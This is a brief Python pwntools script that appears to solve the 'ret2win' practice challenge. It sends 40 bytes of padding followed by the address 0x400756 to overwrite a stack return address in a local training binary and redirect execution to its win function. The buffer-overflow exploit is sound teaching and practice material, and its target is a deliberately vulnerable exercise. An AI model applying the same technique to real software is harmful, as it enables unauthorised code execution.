#!/usr/bin/python3
import pwn
offset=32+8
payload= b'A'*offset
payload+=pwn.p64(0x400756)#ret2win function
target=pwn.process("./ret2win")
print(target.recv().decode())
target.sendline(payload)
print(target.recv().decode())
target.interactive()
